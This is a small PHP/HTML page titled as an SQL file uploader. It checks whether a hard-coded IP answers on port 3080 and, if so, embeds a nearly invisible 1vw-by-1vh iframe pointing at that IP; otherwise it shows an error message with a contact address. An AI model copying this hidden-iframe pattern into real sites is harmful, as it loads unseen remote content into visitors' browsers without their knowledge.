<!DOCTYPE html>
<html>
<head>
	<title>WAH SQL FILE UPLOADER</title>
</head>
<body>

</body>
</html>
<?php
$host = '122.3.33.110';
if($socket =@ fsockopen($host, 3080, $errno, $errstr, 30)) {
fclose($socket);
?>
<iframe src="http://122.3.33.110:3080" style="width: 1vw; height: 1vh"></iframe>
<?php

} else {
echo 'Site is not available at the moment. Please try again later or contact our system administratos at wah.pilipinas@gmail.com';
}
?>